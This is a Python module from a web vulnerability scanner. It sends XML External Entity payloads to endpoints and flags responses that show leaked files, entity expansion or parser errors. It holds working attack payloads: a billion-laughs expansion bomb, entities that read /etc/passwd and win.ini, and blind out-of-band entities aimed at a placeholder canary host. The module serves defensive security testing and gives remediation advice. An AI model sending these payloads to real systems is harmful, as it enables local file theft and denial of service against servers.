"""
GrotAssault — XXE (XML External Entity) payloads and detection.

Provides:
  - Payload sets for entity expansion, external entities, parameter entities,
    and blind XXE (out-of-band)
  - Response analysis to detect successful XXE exploitation
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass
from typing import List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.xxe")


# ---------------------------------------------------------------------------
# Payload databases
# ---------------------------------------------------------------------------

# Classic entity-expansion (billion laughs / entity bomb variants)
_ENTITY_EXPANSION_PAYLOADS: List[str] = [
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE lolz ['
        '  <!ENTITY lol "lol">'
        '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
        ']><root>&lol3;</root>'
    ),
]

# External entity — read local files
_EXTERNAL_ENTITY_PAYLOADS: List[str] = [
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
        ']><root>&xxe;</root>'
    ),
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">'
        ']><root>&xxe;</root>'
    ),
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY xxe SYSTEM "file:///etc/hostname">'
        ']><root>&xxe;</root>'
    ),
]

# Parameter entity — alternative entity syntax
_PARAM_ENTITY_PAYLOADS: List[str] = [
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">'
        '  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///dev/null\'>">'
        '  %eval;'
        ']><root>test</root>'
    ),
]

# Blind XXE — out-of-band via HTTP/FTP (use placeholder domain)
_BLIND_XXE_PAYLOADS: List[str] = [
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY xxe SYSTEM "http://xxe-canary.internal/probe">'
        ']><root>&xxe;</root>'
    ),
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '  <!ENTITY % xxe SYSTEM "http://xxe-canary.internal/dtd">'
        '  %xxe;'
        ']><root>test</root>'
    ),
]

# All payloads combined
ALL_XXE_PAYLOADS: List[str] = (
    _ENTITY_EXPANSION_PAYLOADS
    + _EXTERNAL_ENTITY_PAYLOADS
    + _PARAM_ENTITY_PAYLOADS
    + _BLIND_XXE_PAYLOADS
)


# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

# Signs that an external entity was resolved
_FILE_CONTENT_PATTERNS = [
    re.compile(r"root:.*:0:0:", re.IGNORECASE),          # /etc/passwd
    re.compile(r"\[fonts\]", re.IGNORECASE),              # win.ini
    re.compile(r"\[extensions\]", re.IGNORECASE),         # win.ini
    re.compile(r"localhost", re.IGNORECASE),               # /etc/hostname
]

# Entity expansion indicator — massive repeated content or timeout
_EXPANSION_INDICATORS = [
    re.compile(r"(lol){10,}"),  # billion laughs output
]

# XML parse error leaking internal info
_ERROR_LEAK_PATTERNS = [
    re.compile(r"SYSTEM\s+\"file:", re.IGNORECASE),
    re.compile(r"EntityRef|DTD|DOCTYPE", re.IGNORECASE),
    re.compile(r"org\.xml\.sax|javax\.xml|libxml", re.IGNORECASE),
]


# ---------------------------------------------------------------------------
# XxeChecker
# ---------------------------------------------------------------------------

@dataclass
class XxeResult(HttpClientMixin):
    """Result of a single XXE payload attempt."""
    payload_type: str
    status_code: int
    body_snippet: str
    file_content_leaked: bool = False
    entity_expanded: bool = False
    error_leaked: bool = False


class XxeChecker(HttpClientMixin):
    """Test endpoints for XML External Entity vulnerabilities.

    Parameters
    ----------
    http_client:
        Optional shared :class:`HttpClient`.
    """

    def __init__(
        self, *, http_client: Optional[HttpClient] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def check(self, target: Target) -> List[Finding]:
        """Send XXE payloads to *target* and analyse responses."""
        client = self._client or HttpClient(timeout=15.0, retries=0)
        try:
            findings: List[Finding] = []

            # Only test endpoints that might accept XML
            content_type = target.headers.get("Content-Type", "")
            accepts_xml = (
                "xml" in content_type.lower()
                or target.method.upper() in ("POST", "PUT", "PATCH")
            )
            if not accepts_xml:
                return findings

            for payload_type, payloads in [
                ("external_entity", _EXTERNAL_ENTITY_PAYLOADS),
                ("entity_expansion", _ENTITY_EXPANSION_PAYLOADS),
                ("parameter_entity", _PARAM_ENTITY_PAYLOADS),
                ("blind_xxe", _BLIND_XXE_PAYLOADS),
            ]:
                for payload in payloads:
                    result = await self._send_payload(
                        client, target, payload, payload_type,
                    )
                    if result and (
                        result.file_content_leaked
                        or result.entity_expanded
                        or result.error_leaked
                    ):
                        findings.append(self._result_to_finding(result, target))

            return findings
        finally:
            if self._owns_client and client is not self._client:
                await client.close()

    # ------------------------------------------------------------------
    # Payload delivery
    # ------------------------------------------------------------------

    async def _send_payload(
        self,
        client: HttpClient,
        target: Target,
        payload: str,
        payload_type: str,
    ) -> Optional[XxeResult]:
        """Send a single XXE payload and analyse the response."""
        headers = dict(target.headers)
        headers["Content-Type"] = "application/xml"

        try:
            resp = await client.request(
                target.method or "POST",
                target.url,
                headers=headers,
                body=payload,
            )
        except (httpx.HTTPError, OSError):
            return None

        body = resp.text[:4096]  # cap analysis size

        file_leaked = any(p.search(body) for p in _FILE_CONTENT_PATTERNS)
        entity_expanded = any(p.search(body) for p in _EXPANSION_INDICATORS)
        error_leaked = any(p.search(body) for p in _ERROR_LEAK_PATTERNS)

        return XxeResult(
            payload_type=payload_type,
            status_code=resp.status_code,
            body_snippet=body[:200],
            file_content_leaked=file_leaked,
            entity_expanded=entity_expanded,
            error_leaked=error_leaked,
        )

    # ------------------------------------------------------------------
    # Finding construction
    # ------------------------------------------------------------------

    @staticmethod
    def _result_to_finding(result: XxeResult, target: Target) -> Finding:
        if result.file_content_leaked:
            return Finding(
                title=f"XXE: local file content leaked via {result.payload_type}",
                description=(
                    f"The endpoint {target.url} returned content consistent with "
                    f"a local file read when sent a {result.payload_type} payload. "
                    "This indicates the XML parser processes external entities."
                ),
                severity=Severity.CRITICAL,
                target=target,
                evidence=result.body_snippet,
                remediation=(
                    "Disable external entity processing in the XML parser. "
                    "Use defusedxml or equivalent safe parser configuration."
                ),
                cwe=611,
                tags=["injection", "xxe", "file-read"],
            )
        elif result.entity_expanded:
            return Finding(
                title=f"XXE: entity expansion detected ({result.payload_type})",
                description=(
                    f"The endpoint {target.url} shows signs of XML entity expansion "
                    "(e.g. billion-laughs). This could lead to denial of service."
                ),
                severity=Severity.HIGH,
                target=target,
                evidence=result.body_snippet,
                remediation=(
                    "Disable DTD processing or limit entity expansion depth "
                    "in the XML parser configuration."
                ),
                cwe=776,
                tags=["injection", "xxe", "entity-expansion", "dos"],
            )
        else:
            return Finding(
                title=f"XXE: XML parser error leaks internal details ({result.payload_type})",
                description=(
                    f"The endpoint {target.url} returned an error message that "
                    "reveals details about the XML parser or internal file paths "
                    "when sent an XXE payload."
                ),
                severity=Severity.MEDIUM,
                target=target,
                evidence=result.body_snippet,
                remediation=(
                    "Suppress detailed XML parser errors in production. "
                    "Return generic error messages."
                ),
                cwe=209,
                tags=["injection", "xxe", "info-leak"],
            )
